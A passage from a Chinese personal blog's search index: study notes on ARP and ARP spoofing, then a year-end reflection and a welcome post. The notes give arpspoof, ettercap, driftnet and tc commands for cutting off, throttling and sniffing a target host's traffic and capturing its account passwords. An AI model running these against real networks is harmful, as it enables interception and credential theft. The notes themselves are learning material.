src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>第五步：</p><p>当主机A收到从主机B发来的ARP回复消息时，会使用主机B的IP地址和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束，将再次重复上面的内容。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p><h4 id="命令窗口玩转ARP"><a href="#命令窗口玩转ARP" class="headerlink" title="命令窗口玩转ARP"></a>命令窗口玩转ARP</h4><p>输入<code>arp</code>提示使用方法</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>这里一开始总是说“’ARP’不是可执行的程序”，凭我踩坑经验知道这是环境变量的问题。费尽千辛万苦发现是因为我的环境变量里居然没有system32🥲。但是输入path查看是有它的，不知道哪里出了问题，加上之后重启就好啦</p></blockquote><p>输入<code>arp -a</code>查看ARP缓存表信息</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>静态</strong>地址即主机自己配置生成的地址。</p><p>当主机新连接入一台设备，并且与主机产生通信后，aqp表会更新一条<strong>动态</strong>地址。</p><h3 id="ARP攻击"><a href="#ARP攻击" class="headerlink" title="ARP攻击"></a>ARP攻击</h3><p>ARP攻击就是通过伪造IP地址和MAC地址的对应关系，使得网络无法正常通信。即修改靶机的IP地址和MAC地址，使其他设备与靶机的通信无法正常进行，进而截断靶机流量。</p><blockquote><p>可以直接使用arpspoof插件攻击</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[目标IP]</span> -r <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>这里”r”的用法没搞懂😣好像就是直接双向攻击</p><p>Ctrl+C或关闭终端即停止攻击</p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><del>听说ARP欺骗配合DNS欺骗效果更佳</del>🤨</p><h5 id="可以用来干的坏事"><a href="#可以用来干的坏事" class="headerlink" title="可以用来干的坏事"></a>可以用来干的坏事</h5><ul><li>获取浏览图片</li><li>获取靶机各平台输入的账号密码</li><li>获取浏览地址</li></ul><h5 id="行骗方法"><a href="#行骗方法" class="headerlink" title="行骗方法"></a>行骗方法</h5><h6 id="1-伪装成网关"><a href="#1-伪装成网关" class="headerlink" title="1.伪装成网关"></a>1.伪装成网关</h6><p>欺骗源把自己伪装成网关，向局域网内的目标主机发送ARP报文，使得局域网内的主机误以为欺骗源的MAC地址是网关MAC地址，并将原本应该流向网关的数据都发送到欺骗源。</p><blockquote><p>直接对靶机实施ARP欺骗</p></blockquote><h6 id="2-伪装成主机"><a href="#2-伪装成主机" class="headerlink" title="2.伪装成主机"></a>2.伪装成主机</h6><p>用来欺骗局域网内的其他所有主机</p><p>欺骗源将自己伪装成局域网内的另一台主机3，将主机3的IP地址对应的MAC地址替换为欺骗元的IP地址对应的MAC地址使得局域网内靶机发往主机3的报文都流向欺骗源</p><blockquote><p>分别对网关和靶机实施ARP欺骗</p></blockquote><h3 id="操作步骤（行骗步骤）"><a href="#操作步骤（行骗步骤）" class="headerlink" title="操作步骤（行骗步骤）"></a>操作步骤<del>（行骗步骤）</del></h3><blockquote><p>伪装成网关</p></blockquote><p>首先查看欺骗源和靶机的IP地址</p><ul><li><p>直接查看：kali命令窗口输入<code>ifconfig</code>，Windows命令窗口输入<code>ipconfig</code></p></li><li><p>正经方法：</p><p>1.在kali命令窗口输入<code>fping -g xxx.xxx.xxx[网络号码].1/24</code>查询目标网络下的所有主机IP </p><p>2.输入命令<code>nmap -sP xxx.xxx.xxx[网络号码].0/24</code>查询目标网络下的所有主机IP</p></li></ul><p>输入命令<code>route-n</code>查看网关</p><p>使用arpspoof行骗</p><blockquote><p>kali命令窗口输入sudo arpspoof -h查看已经安装的arpspoof版本号，如果未安装，系统会弹出提示，按照提示安装即可 </p></blockquote><p>断网操作</p><p>把靶机发出的请求接受到攻击源主机，因为linux默认ip_forward为0，即不进行流量转发，所以靶机会断网</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让靶机认为攻击源为网关：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[目标IP]</span> <span class="hljs-selector-attr">[网关]</span><br></code></pre></td></tr></table></figure><p>或者反向欺骗</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">让网关认为攻击源是靶机：<br>sudo arpspoof -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span> -t <span class="hljs-selector-attr">[网关]</span> <span class="hljs-selector-attr">[目标IP]</span><br></code></pre></td></tr></table></figure><blockquote><p>网卡默认eth0</p></blockquote><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-05_23-10-21.jpg"></p><p><code>cat /proc/sys/net/ipv4/ip_forward </code>查看ip_forward的值。如果ip_forward为0，则被攻击主机不能上网；如果ip_forward为1，则被攻击主机可以上网</p><p>修改数值让他上网</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward<br></code></pre></td></tr></table></figure><blockquote><p>权限不够就<code>sudo -i</code> 使用root权限改</p></blockquote><p>限制网速</p><p>可以使用的工具有tc、iptables、WonderShaper等等，</p><p>以tc为例<del>本菜鸡还没学会后两个</del>😢：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs maxima">限制网速200ms延时<br>sudo tc qdisc add dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br> <br>取消限制网速200ms延时<br>sudo tc qdisc <span class="hljs-built_in">del</span> dev eth0 root netem <span class="hljs-built_in">delay</span> 200ms<br></code></pre></td></tr></table></figure><p>拦截数据—获取浏览网页及账号密码</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -Tq -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><p>嗅探图片</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">driftnet  -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-attr">[网卡]</span><br></code></pre></td></tr></table></figure><hr><h3 id="工具说明书"><a href="#工具说明书" class="headerlink" title="工具说明书"></a>工具说明书</h3><p>因为各种工具的使用说明都是英文的，所以直接利用万能的互联网搜了一下中文的使用指南：</p><h5 id="driftnet"><a href="#driftnet" class="headerlink" title="driftnet"></a>driftnet</h5> <figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">语法： driftnet   <span class="hljs-selector-attr">[options]</span>   <span class="hljs-selector-attr">[filter code]</span><br><br> -<span class="hljs-selector-tag">b</span>  捕获到新的图片时发出嘟嘟声<br> -<span class="hljs-selector-tag">i</span>  interface     选择监听接口<br> -f  file   读取一个指定pcap数据包中的图片<br> -<span class="hljs-selector-tag">p</span>  不让所监听的接口使用混杂模式<br> -<span class="hljs-selector-tag">a</span>  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）<br> -m  number 指定保存图片数的数目<br> -d  directory  指定保存图片的路径<br> -x  prefix  指定保存图片的前缀名<br></code></pre></td></tr></table></figure><h5 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a>arpspoof</h5><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs markdown">名字 <br><span class="hljs-code">       arpspoof - 截获交换局域网中的数据包</span><br><span class="hljs-code"></span><br>用法<br><span class="hljs-code">       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</span><br><span class="hljs-code"></span><br>描述<br><span class="hljs-code">       arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。</span><br><span class="hljs-code">       内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。</span><br><span class="hljs-code"></span><br>参数<br><span class="hljs-code">       -i interface</span><br><span class="hljs-code">              指定要使用的接口（即指定一块网卡）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -c own|host|both</span><br><span class="hljs-code">              指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。</span><br><span class="hljs-code">              使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -t target</span><br><span class="hljs-code">              指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。</span><br><span class="hljs-code"></span><br><span class="hljs-code">       -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）</span><br><span class="hljs-code"></span><br><span class="hljs-code">       host   host是你想要截获数据包的主机 (通常是网关)。</span><br><span class="hljs-code"></span><br></code></pre></td></tr></table></figure><h5 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h5><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">i</span>后面跟着连接局域网的网卡<br>T指的是text文本模式<br><span class="hljs-selector-tag">q</span>以安静模式执行这个命令<br>M指定攻击模式<br>&gt;&gt;输出文件<br></code></pre></td></tr></table></figure><hr><p>发个笔记上来不然这个博客真的成碎碎念专栏了😶‍🌫️</p><p>我就是个菜鸡🍃</p>]]></content>
    
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>ARP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>年终总结</title>
    <link href="/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"/>
    <url>/2022/12/29/%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>想好怎样告别2022了吗？🥰</p><span id="more"></span><p>我总是喜欢在年末给未来一年的自己留下祝福，今年还是像往年一样的套路：希望2023的自己可以更洒脱、更自由。</p><p>过去的一年，我来到了梦寐以求的十八岁。我从被囚禁在应试教育中的高中生变成了悠闲又忙碌的大学生；我考出了驾照、学会了弹吉他；我第一次离开了父母、远离家乡，开始住宿生活；我了解到不同的世界，看到了新的风景。</p><p>过去的一年，我和很多人相遇，也和很多人告别。</p><p>这几天我想为自己挑选年度九图，于是乎我翻出了网盘里属于高中的文件夹。毕竟就在上半年，我还是一个被豢养的高考金丝雀。我打开看，里面盛满了我高三那年用老古董相机定格的青春热血。文件夹里有学校里盛开的花，阳光下惬意的猫，还有数不清的意气风发的少年。还记得，晦涩而又灿烂的高三，每天晚自习的最后半小时，我都没有向老师家长叮嘱的那般抓紧时间背单词、写大题，我把时间用来在本子上记录我的喜怒哀乐，书写我对这段时光的不舍与留恋。高中毕业，我攒了三本日记加一本随笔。</p><p>我仍记得毕业那场分别，我们背着书包，像平常那样说着再见。我和朋友们没有轰轰烈烈的告别，只有在耳边吹过的炎热又潮湿的晚风，和窗外的喧闹不止的蝉鸣。我将记录随笔的本子带到了大学，却未曾在上面写下一个文字。我只是一次又一次的翻开它，当作大学生活中的乐趣，去重温那段兵荒马乱而又潇洒肆意的时光。就像我在本子里写下的第一段话——“我所记录的每一个文字，都是过去的我对未来的赠礼”。</p><p>四个月的大学好像电影胶卷，被机器拉扯着，在我眼前一闪而过，但是这条路上仍然有精彩的风景。我遇到了新的朋友，和他们分享不同的幸福。全新的生活并不没有让我感到不安，或许是骨子里的积极勇敢，异或许是身边伙伴的鼓励陪伴，让我的这段新的旅程总是平稳畅通的。从学期初的擒敌拳，到学会的投篮捡漏技巧，还有为了交作业尝试的改源码的歪门邪道，再到期末临走前夜获得的羽毛球耍帅技巧······这些奇奇怪怪的技能背后，都有一群我非常感谢相遇相识的人。我还是个喜欢收集物料的人，宿舍书桌上的软木板，钉着我的第一张献血证书，贴着我第一次部门破冰会议的卡片，框架边缘里夹还有临走时收到的新年贺卡······这些物件承载的故事总能在回忆里熠熠生辉。</p><p>在夜深时分，我经常会把这些碎片从记忆深处拎出来，把他们拼凑成完整的拼图。</p><p><del>好吧，我承认自己总是活在回忆里。</del></p><p>最后，感谢2022，让我遇到了意趣相投的人，也让我拥有滚烫而又热烈的记忆。</p><p>新的一年，愿我所爱，平安顺遂。🎆</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>乐园入场券</title>
    <link href="/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/"/>
    <url>/2022/12/10/%E4%B9%90%E5%9B%AD%E5%85%A5%E5%9C%BA%E5%88%B8/</url>
    
    <content type="html"><![CDATA[<p>这是一张乐园入场券</p><span id="more"></span><p>恭喜你发现了宝藏！</p><p>成功搭建这个博客这是我上大学以来做过最有成就感的事。虽然过程中踩了很多坑，但感谢我没有放弃，才有了现在这个属于我的小小极乐世界。</p><p>这里是一个Modifier的备忘仓库，也有很多未知宝藏。</p><hr><p>最近在不停地修改我的文章，尽可能的把文章写得简洁明了。</p><p>一些很基础的东西也发上来，一是想记录自己的学习历程，二是想着，等到哪天我的文章也有人看了，能让人一下子就能看得明白。</p><hr><p>如果你看到了这里，那就祝你在Modifier的极乐世界里享受自由与快乐吧！</p>]]></content>
    
    
    <categories>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
